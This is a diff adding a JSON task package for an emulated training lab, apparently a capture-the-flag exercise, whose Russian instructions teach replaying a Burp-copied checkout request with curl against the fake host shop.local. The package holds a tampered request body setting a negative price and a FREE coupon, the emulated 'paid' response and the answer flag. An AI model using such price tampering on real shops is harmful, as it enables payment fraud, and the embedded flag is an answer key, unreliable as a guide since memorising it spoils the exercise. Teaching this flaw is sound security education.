@@ -1,0 +1,22 @@
+{
+  "id": "web-tool-burp-zap",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{burp_c0py_4s_curl_r3pl4y}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: Burp/ZAP — Copy as cURL и replay\n\nUI валидирует цену на клиенте, но сервер доверяет телу запроса. Скопируй\nзапрос из Burp (Proxy → Copy as cURL), измени `price` на отрицательный и\nотправь через curl — классический replay мимо клиентской логики.\n\n1. Обычный checkout (клиентская валидация):\n\n   curl -s https://shop.local/checkout\n\n2. Replay из Burp (payload в файле replay.txt):\n\n   curl -s https://shop.local/checkout --data-binary @replay.txt > found.txt\n\n3. Набери `check`.\n" },
+    { "path": "/home/student/task/replay.txt", "text": "{\"cart\":[{\"id\":10,\"qty\":1}],\"price\":-1000,\"coupon\":\"FREE\"}" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "--data-binary|replay|price", "example": "-s https://shop.local/checkout --data-binary @replay.txt", "output": "{\"status\":\"paid\",\"charged\":-1000,\"balance\":1000,\"note\":\"server trusted client price\",\"flag\":\"nto{burp_c0py_4s_curl_r3pl4y}\"}\n" },
+        { "match": "checkout", "example": "-s https://shop.local/checkout", "output": "<form id=\"checkout\"><input name=\"price\" value=\"999\" readonly><p>client-side validation enabled</p></form>\n" },
+        { "match": "shop\\.local", "example": "-s https://shop.local/", "output": "<!doctype html><title>shop</title>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется shop.local.\n"
+    }
+  }
+}
